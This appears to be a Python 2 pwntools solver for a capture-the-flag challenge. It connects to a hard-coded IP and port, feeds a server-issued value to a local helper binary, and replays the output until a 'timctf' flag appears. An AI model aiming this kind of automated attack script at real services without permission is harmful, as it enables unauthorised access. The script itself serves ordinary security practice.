from pwn import *
import sys

for i in xrange(100):
	r = remote('89.38.210.128', 1337)
	r2 = process('./test')
	r.recvuntil('is ')
	magic = '0x' + r.recvline()
	print magic

	r2.sendline(magic)
	p = r2.recvall(timeout=2)
	if len(p) > 1:
		r.recvuntil('please!\n')
		n = p.split(':')[0]
		p = p.split(':')[1]
		print n + 'th: ' + p
		for i in range(int(n)+1):
			r.send(p)
			msg = r.recv(1024)
			if 'timctf' in msg:
				print msg
				sys.exit()
